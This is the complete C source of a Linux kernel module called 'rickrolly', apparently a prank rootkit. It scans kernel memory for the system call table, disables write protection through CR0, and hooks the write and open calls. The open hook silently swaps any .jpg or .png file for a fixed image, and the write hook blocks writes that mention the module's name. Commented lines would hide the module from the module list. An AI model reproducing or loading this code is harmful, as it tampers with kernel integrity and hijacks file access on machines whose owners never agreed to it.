#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fcntl.h>

MODULE_LICENSE("GPL");

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

int rickrolly_init(void);
void rickrolly_exit(void);
module_init(rickrolly_init);
module_exit(rickrolly_exit);

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage int (*o_open)(const char __user *pathname, int flags);

psize *sys_call_table;

psize **find(void){
    psize **sctable;
    psize i = START_CHECK;
    while(i<END_CHECK){
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close){
            return &sctable[0];
        } 
        i+=sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t rickrolly_write(int fd, const char __user *buff, ssize_t count){
    int r;
    char *proc_protect = ".rickrolly";
    char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
    copy_from_user(kbuff,buff,255);
    if (strstr(kbuff,proc_protect)) {
        kfree(kbuff);
        return EEXIST;
    }
    r = (*o_write)(fd,buff,count);
    kfree(kbuff);
    return r;
}

asmlinkage int rickrolly_open(const char __user *pathname, int flags){
    char* rickrolly_path = "data/data-gh.jpg";
    char* kbuff = (char *) kmalloc(256, GFP_KERNEL);
    copy_from_user(kbuff, pathname, 255);
    if(strstr(kbuff, ".jpg") || strstr(kbuff, ".png")){
        copy_to_user((void*)pathname, rickrolly_path, strlen(rickrolly_path)+1);

    }
    kfree(kbuff);
    return (*o_open)(pathname, flags); 
}

int rickrolly_init(void) {
    printk("rickrolly: module loaded\n");
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);
    if((sys_call_table = (psize*)find())){
       printk("rickrolly: found syscall table\n");
    }
    else{
       printk("rickrolly: syscall table not found\n");
    } 
    write_cr0(read_cr0() & (~ 0x10000));
    o_write = (void *) xchg(&sys_call_table[__NR_write],(psize)rickrolly_write);
    o_open = (void *) xchg(&sys_call_table[__NR_open],(psize)rickrolly_open);
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

void rickrolly_exit(void) {
   write_cr0(read_cr0() & (~ 0x10000));
   xchg(&sys_call_table[__NR_write],(psize)o_write);
   xchg(&sys_call_table[__NR_open],(psize)o_open);
   write_cr0(read_cr0() | 0x10000);
   printk("rickrolly: module removed\n");
}
